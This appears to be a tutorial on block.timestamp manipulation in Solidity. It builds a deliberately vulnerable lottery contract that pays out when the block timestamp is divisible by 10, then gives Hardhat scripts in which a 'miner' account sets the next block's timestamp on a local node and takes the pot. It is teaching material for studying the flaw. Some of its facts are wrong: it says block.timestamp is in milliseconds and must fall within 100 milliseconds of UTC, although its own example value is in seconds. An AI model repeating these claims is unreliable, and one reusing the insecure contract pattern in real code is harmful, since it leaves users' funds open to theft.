# block.timestamp attack

block.timestamp is a global variable that returns the timestamp at which the block is mined, we will learn how incorrect use of the block.timestamp could lead to security vulnerabilities in smart contracts.

## What is block.timestamp?

block.timestamp is a global variable (expressed in milliseconds since the start of the Unix epoch) that returns the timestamp at which the block is mined and it can be manipulated by the miner with some restrictions like the next blockâ€™s timestamp should be after the previous blockâ€™s timestamp and the block's timestamp value is within 100 milliseconds of the UTC time.

## Manipulating block.timestamp

### What will happen?

Users can play the lottery game by sending 1 ether to the contract and if someone is chosen as a winner, they will be sent the complete balance of the contract.

There will be a Game.sol smart contract that contains the logic of our lottery game.

### Build

Let's build an example where you can experience how the attack happens.

- To setup a Hardhat project, Open up a terminal and execute these commands

  ```bash
  npm init --yes
  npm install --save-dev hardhat
  ```

- If you are not on mac, please do this extra step and install these libraries as well :)

  ```bash
  npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
  ```

- In the same directory where you installed Hardhat run:

  ```bash
  npx hardhat
  ```

  - Select `Create a basic sample project`
  - Press enter for the already specified `Hardhat Project root`
  - Press enter for the question on if you want to add a `.gitignore`
  - Press enter for `Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?`

Now you have a hardhat project ready to go!

Now letâ€™s create `Game.sol` smart contract:

Create a file named `Game.sol` inside your contracts folder and add the following lines of code.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Game{
    uint public lastBlockTimestamp;

    receive() external payable{
        require(msg.value == 1 ether, "Not eligible");
        require(block.timestamp != lastBlockTimestamp);

        lastBlockTimestamp = block.timestamp;
        if(block.timestamp % 10 == 0){
            (bool sent, ) = msg.sender.call{value: address(this).balance}("");
            require(sent, "Failed to send");
        }
    }
}
```

Now lets try immitating the attack by deploying contract on hardhat local node. Create a new file under scripts folder named `deploy-game.js` and add the following lines of code to it

```javascript
const { ethers } = require('hardhat');

async function main() {
  const Game = await ethers.getContractFactory('Game');
  const game = await Game.deploy();

  await game.deployed();
  console.log('Game contract deployed at:', game.address);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
```

Now, create a new file under scripts folder named `play-game.js` and add the following lines of code to it:

```javascript
const { ethers, network } = require('hardhat');

async function main() {
  const [user1, user2, miner] = await ethers.getSigners();
  const gameContractAddress = 'game contract address....';

  // User1 playing game
  await user1.sendTransaction({
    to: gameContractAddress,
    value: ethers.utils.parseEther('1.0'), // Sends exactly 1.0 ether
    gasLimit: '999999',
  });

  // User2 playing game
  await user2.sendTransaction({
    to: gameContractAddress,
    value: ethers.utils.parseEther('1.0'), // Sends exactly 1.0 ether
    gasLimit: '999999',
  });

  // Miner manipulating the next block timestamp such that it is divisble by 10
  await network.provider.send('evm_setNextBlockTimestamp', [1699531300]);

  await miner.sendTransaction({
    to: gameContractAddress,
    value: ethers.utils.parseEther('1.0'), // Sends exactly 1.0 ether
    gasLimit: '999999',
  });

  // Fetch the block details
  const receipt = await ethers.provider.getBlock('latest');
  console.log('Latest block timestamp:', receipt.timestamp);

  // Get balance of the contract
  const balance = await ethers.provider.getBalance(gameContractAddress);
  console.log(`Contract Balance: ${ethers.utils.formatEther(balance)}`);

  // Get balance of miner account
  const balanceUser1 = await ethers.provider.getBalance(user1.address);
  console.log(`User1 Balance: ${ethers.utils.formatEther(balanceUser1)}`);

  // Get balance of miner account
  const balanceUser2 = await ethers.provider.getBalance(user2.address);
  console.log(`User2 Balance: ${ethers.utils.formatEther(balanceUser2)}`);

  // Get balance of miner account
  const balanceMiner = await ethers.provider.getBalance(miner.address);
  console.log(`Miner Balance: ${ethers.utils.formatEther(balanceMiner)}`);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
```

Now start the local hardhat node as:

```bash
npx hardhat node
```

Deploy the game smart contract to local hardhat network as:

```bash
npx hardhat run --network localhost scripts/deploy-game.js
```

Deploy the script which contains the logic of random user playing the game and miner manipulating the block.timestamp:

```bash
npx hardhat run --network localhost scripts/play-game.js
```

The attack will happen as follows:

- Users start playing the lottery game by sending ether to the contract.
- Miner wait for users to play this game.
- Once the contract has enough ethers, miner also plays the game and mine the transaction in a block with manipulated block.timestamp such that it is divisible by 10 and wins the game.

## Prevention:

- Avoid using block.number as a timestamp
- <b>Use the 15-second rule:</b> It is safe to utilize the block.timestamp if the magnitude of your time-dependent event may vary by 15 seconds while maintaining integrity.
